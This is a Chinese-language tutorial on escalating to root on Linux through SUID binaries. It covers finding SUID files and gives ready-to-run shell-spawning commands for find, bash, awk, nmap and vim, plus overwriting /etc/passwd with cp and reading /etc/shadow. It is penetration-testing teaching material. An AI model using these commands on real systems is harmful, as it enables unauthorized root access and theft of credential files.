SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行，如果某些特殊命令设置了SUID，那么有可能被提权。
设置SUID
Default
文件有s属性说明支持SUID，可以使用ls操作查看
 
设置SUID
chmod u+s /usr/bin/find
取消SUID
chmod u-s /usr/bin/find
查找
Default
使用命令查找正在系统上运行的所有SUID可执行文件，不同系统命令不一样，都尝试一下
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
 
 
正常情况常用的就以下几个
nmap、vim、find、bash、more、less、nano、cp、awk

find提权

利用上面命令查找，如果发现有find
Default
随便新建一个文件，或利用已有文件
touch abc
 
以SUID即root权限执行命令
find abc -exec whomai \;
/usr/bin/find abc -exec whoami \;

Bash提权
Default
使用-p参数打开一个root权限的shell
bash -p

less、more提权
Default
less命令也是个查看文件内容的，也可以使用该命令进入shell
 
more也是相同原理

cp提权
Default
使用该命令尝试覆盖/etc/passwd
cp ./123 /etc/passwd

awk提权
Default
使用awk命令进入shell
awk 'BEGIN {system("/bin/bash")}'

nmap提权
Default
适用2.02到5.21版本
早版本nmap是带有交互模式的，原理就是用交互模式执行shell
 
进入交互模式
nmap --interactive
 
提权
nmap> !sh

vim提权
Default
vim编辑器以SUID方式运行，则继承root用户权限
vim.tiny  /etc/shadow
 
vim命令
:set shell = '/bin/sh'
:shell

其他
Default
想学习其他命令是否可以，可以到https://gtfobins.github.io/网站搜索